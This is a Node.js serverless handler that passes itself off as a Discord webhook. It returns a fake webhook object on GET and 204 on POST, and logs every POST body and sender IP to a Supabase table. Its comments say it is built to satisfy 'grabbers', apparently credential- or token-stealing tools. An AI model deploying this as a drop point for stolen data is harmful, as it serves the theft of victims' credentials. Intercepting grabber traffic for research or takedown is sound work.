// --- PURE NODE.JS WEBHOOK HANDLER (NO LIBRARIES) ---
const https = require('https');

// --- Helper: Get Body ---
const getRawBody = async (req) => {
    return new Promise((resolve, reject) => {
        const chunks = [];
        req.on('data', (chunk) => chunks.push(chunk));
        req.on('end', () => resolve(Buffer.concat(chunks)));
        req.on('error', (err) => reject(err));
    });
};

// --- Helper: Supabase REST Request ---
const supabaseRequest = async (endpoint, method, body) => {
    const SUPABASE_URL = process.env.SUPABASE_URL;
    const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY;

    if (!SUPABASE_URL || !SUPABASE_ANON_KEY) throw new Error("Missing Env Vars");

    // Clean URL
    const baseUrl = SUPABASE_URL.replace(/\/$/, '');
    const url = new URL(`${baseUrl}/rest/v1/${endpoint}`);

    return new Promise((resolve, reject) => {
        const options = {
            method: method,
            headers: {
                'apikey': SUPABASE_ANON_KEY,
                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
                'Content-Type': 'application/json',
                'Prefer': 'return=minimal'
            }
        };

        const req = https.request(url, options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    resolve(data);
                } else {
                    reject(new Error(`Supabase Error ${res.statusCode}: ${data}`));
                }
            });
        });

        req.on('error', (e) => reject(e));
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
};

module.exports = async (req, res) => {
    // CORS (Important for browser requests, maybe less for Grabbers, but keep it)
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version, X-File-Name, X-Channel-Id');

    if (req.method === 'OPTIONS') return res.status(200).end();

    // --- DISCORD MIMICRY: GET Request ---
    // Some tools check if the webhook URL is valid by sending a GET request.
    // We return a fake Discord webhook object to satisfy them.
    if (req.method === 'GET') {
        return res.status(200).json({
            type: 1,
            id: "1234567890",
            name: "Custom Webhook",
            avatar: null,
            channel_id: "1234567890",
            guild_id: "1234567890",
            application_id: null,
            token: "fake-token"
        });
    }

    if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

    try {
        const buffer = await getRawBody(req);
        const rawContent = buffer.toString('utf-8');
        
        let validContent = rawContent;
        // Try to parse JSON to see if it's a known format
        try {
            const json = JSON.parse(rawContent);
            // If it's a standard Discord payload (has 'content' or 'embeds'), store it properly
            if (json.content || json.embeds || json.username) {
                validContent = JSON.stringify(json);
            }
            // If it's our own format
            else if (json.type === 'chat_message') {
                validContent = JSON.stringify(json);
            }
        } catch(e) {}

        const channelId = req.headers['x-channel-id'] || 'andere';
        const ip = req.headers['x-forwarded-for'] || 'unknown';

        // Insert into 'events' table
        await supabaseRequest('events', 'POST', {
            type: 'webhook',
            timestamp: new Date().toISOString(),
            content: validContent,
            name: channelId,
            headers: JSON.stringify({ ip })
        });

        // --- DISCORD MIMICRY: POST Request ---
        // Discord returns 204 No Content by default for successful webhooks.
        // Some tools expect this status code.
        res.status(204).end();

    } catch (error) {
        console.error("Handler Error:", error);
        // Even on error, some grabbers might retry aggressively if we send 500.
        // But for debugging, we should probably return 500.
        res.status(500).json({ error: error.message });
    }
};

module.exports.config = {
    api: {
        bodyParser: false,
    },
};
